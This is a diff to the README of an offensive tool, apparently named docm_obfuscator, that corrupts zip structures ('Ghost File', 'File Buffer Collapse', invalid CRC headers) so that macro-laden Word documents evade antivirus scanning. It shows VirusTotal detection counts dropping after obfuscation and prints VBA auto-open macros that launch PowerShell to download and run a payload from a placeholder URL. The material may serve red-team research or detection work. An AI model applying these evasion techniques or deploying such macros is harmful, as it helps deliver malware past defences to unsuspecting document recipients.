@@ -9,18 +9,36 @@ Obfuscate a macro-containing Word doc (optionally within a .zip file) using "Fil
 ### Run Script Directly
 
 ```
-obfuscate_file.py <in_file> <obfuscation_technique>
+usage: obfuscate_file.py <in_file> <obfuscation_technique>
 
-in_file must be .docm or .zip
-obfuscation_techniques: buffer_collapse, ghost_file, invalid_header, invalid_plus_buffer, invalid_plus_ghost
+in_file                The file to obfuscate. Can be a macro-embedded Word doc (.docm), or a .zip file
+                       containing one or more .docm
+
+obfuscation_technique  Obfuscation technique to use
+
+                       buffer_collapse     "File Buffer Collapse" - Macro's Local File Header is embedded  
+                                            in compressed zip section of another Local File Header
+                       ghost_file          "Ghost File" - Local File Header for macro included without corresponding
+                                            Central Directory File Header
+                       invalid_header       "Invalid File Header" - Local File Header for macro is corrupted with
+                                            invalid CRC-32
+                       invalid_plus_buffer  "Invalid File Header" applied, followed by "File Buffer Collapse"
+                       invalid_plus_ghost   "Invalid File Header" applied, followed by "Ghost File"
+    
 ```
 
 ### API Server
+Starts API server that will listen to GET/POST in below format
 
 ```
-server.py
+usage: server_test.py [-h] [-l LHOST] [-p PORT]
 
-Starts API server that will listen to GET/POST in below format
+optional arguments:
+  -h, --help            show this help message and exit
+  -l LHOST, --lhost LHOST
+                        The bind address to listen on
+  -p PORT, --port PORT  The port to listen on
+
 ```
 
 ### POST - Send doc/zip for obfuscation
@@ -76,3 +94,73 @@ Accept-Encoding: gzip, deflate
 Connection: close
 Upgrade-Insecure-Requests: 1
 ```
+
+## Detections
+
+### Virustotal
+
+#### Malicious .docm
+
+The file "unmodified.docm" (in the artifacts folder on this repo) contains the following macro.
+A message box is popped, then Powershell is spawned and a download from `'http://example.com/malicious/payload.exe'` is attempted
+
+
+```
+Private Sub Document_Open()
+  MsgBox "Macro popping Powershell!", vbOKOnly, "game over"
+  a = Shell("powershell.exe -noexit -Command ""IEX ((new-object net.webclient).downloadstring('http://example.com/malicious/payload.exe'))""", 1)
+End Sub
+```
+
+Without any obfuscation applied, the doc is extensively detected as malicious:
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/unmodified.png?raw=true)
+
+With some of the obfuscation techniques:
+
+"Ghost File"
+
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/ghost_file.png?raw=true)
+
+"Invalid File Header + File Buffer Collapsing"
+
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_buffer.png?raw=true)
+
+
+#### Zip containing malicious .docm
+
+The file "unmodified.zip" (in the artifacts folder on this repo) contains the file "unmodified.docm" referenced above, along with 2 other files.
+No compression/store has been used.
+
+Unmodified:
+
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/unmodified_zip.png?raw=true)
+
+"Invalid File Header + Ghost File"
+
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_ghost_zip.png?raw=true)
+
+"Invalid File Header + File Buffer Collapsing"
+
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/invalid_plus_buffer_zip.png?raw=true)
+
+
+## Further Notes
+
+As referenced in the blog post, these techniques will result in 2 error messages upon opening the obfuscated file. Both messages must be accepted
+("Yes" and "Open") for the macro to trigger.
+
+Error 1
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/error1.png?raw=true)
+
+Error 2
+![alt text](https://github.com/jasonb17/docm_obfuscator/blob/main/images/error2.png?raw=true)
+
+Interestingly, if a slightly different and equally functional Powershell command is used within the VBA macro, only Error 1 is triggered.
+```
+Private Sub Document_Open()
+  MsgBox "Macro popping Powershell!", vbOKOnly, "game over"
+  a = Shell("powershell.exe -noexit -Command ""IWR 'http://example.com/malicious/payload.exe'""", 1)
+End Sub
+```
+
+This command also appeared to result in a slightly lower initial detection numbers on VirusTotal.
